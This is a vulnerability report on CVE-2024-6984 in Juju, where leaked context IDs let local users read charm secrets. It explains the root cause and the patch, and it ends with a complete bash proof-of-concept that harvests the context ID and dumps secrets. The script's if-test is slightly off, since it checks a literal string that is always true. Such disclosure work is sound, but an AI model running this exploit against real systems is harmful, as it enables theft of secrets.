# CVE-2024-6984 Detailed Report

## Summary
CVE-2024-6984 is a vulnerability discovered in Juju, specifically affecting versions v3.5.2 and earlier. The vulnerability falls under the category of CWE-209, which pertains to the generation of error messages that contain sensitive information. This issue allows a local unprivileged attacker to leak sensitive context IDs, which can lead to unauthorized access to other sensitive data or relations accessible to the local charm.

## Root Cause of the Vulnerability
The root cause of this vulnerability lies in the overly permissive file permissions on the `/var/lib/juju/` directory, which allows unprivileged users to access sensitive information. Specifically, the permissions on the directory and its contents are set in such a way that they can be read by users who should not have access to this data.

The provided patch indicates that the vulnerability was exacerbated by the logging of the `JUJU_CONTEXT_ID` in error messages. When an unprivileged user executed certain commands while a hook was running, the error messages would inadvertently expose the context ID. This context ID could then be used in subsequent commands to access sensitive data, such as secrets and relation information.

The patch addresses this issue by modifying the error messages to avoid leaking the context ID. The changes in the code include the introduction of a token generator that ensures that context IDs are not exposed in error messages, thus preventing the exploitation of this vulnerability.

## Exploitation Details
To exploit this vulnerability, an attacker would need to perform the following steps:

1. **Create an Unprivileged User**: The attacker creates an unprivileged user on the host running Juju.
2. **Run a Script**: The attacker runs a script that continuously attempts to execute Juju commands that require a context ID. The script is designed to capture the context ID from error messages.
3. **Access Sensitive Data**: Once the context ID is leaked through an error message, the attacker can use it to access sensitive data, including secrets and relation information, by executing further Juju commands with the captured context ID.

The advisory provides a proof-of-concept (PoC) script that demonstrates this exploitation process.

## Environment Setup Requirements
- **Port**: The PoC uses the default Unix socket for Juju, which does not specify a port number.
- **Target Endpoint**: The script interacts with the Juju agent socket located at `/var/lib/juju/agents/unit-opensearch-4/agent.socket`.
- **Explicit Configuration**: The script requires the following environment variables to be set:
  - `JUJU_AGENT_SOCKET_NETWORK=unix`
  - `JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket`
  - `JUJU_CONTEXT_ID=<context_id>` (this will be dynamically captured by the script)

## Complete PoC Code
```bash
#!/usr/bin/bash

while true; do
    if [ "JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids | grep -q 'bad request: expected context id '" ]; then
        context_id=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids 2>&1 | awk -F"\"" '{print $2}')
        echo $context_id
        echo "Now get the secrets:"
        secret=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-ids | head -n 1)
        echo "Target secret is: $secret"
        value=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-get $secret)
        echo "$value"
    fi
    sleep 5s
done
```

This PoC script continuously attempts to retrieve the context ID and subsequently access secrets, demonstrating the vulnerability's impact.